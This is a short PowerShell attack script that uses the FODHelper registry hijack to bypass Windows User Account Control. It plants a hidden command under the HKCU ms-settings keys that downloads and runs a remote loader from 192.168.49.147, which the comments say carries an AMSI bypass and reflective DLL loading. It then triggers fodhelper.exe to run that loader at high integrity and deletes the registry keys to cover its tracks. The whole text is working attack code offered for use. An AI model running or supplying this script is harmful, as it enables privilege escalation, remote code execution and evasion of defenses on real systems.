# This script uses the FODHelper UAC Bypass to execute the in-memory loader in a High-Integrity context.

# 1. Define the payload to execute in the elevated context.
# This downloads and executes the standard 'run.ps1' loader which contains the AMSI bypass and DLL reflection.
$payload = "powershell.exe -exec bypass -w hidden -nop -c `"IEX(New-Object Net.WebClient).DownloadString('http://192.168.49.147/PS/run.ps1')`""

# 2. Create the necessary registry keys for the FODHelper bypass
New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value $payload -Force
New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force

# 3. Trigger the auto-elevating binary
Start-Process "C:\Windows\System32\fodhelper.exe"

# 4. Wait for the process to establish connection and execute
Start-Sleep -Seconds 3

# 5. Clean up the registry to maintain OpSec and system stability
Remove-Item -Path HKCU:\Software\Classes\ms-settings -Recurse -Force
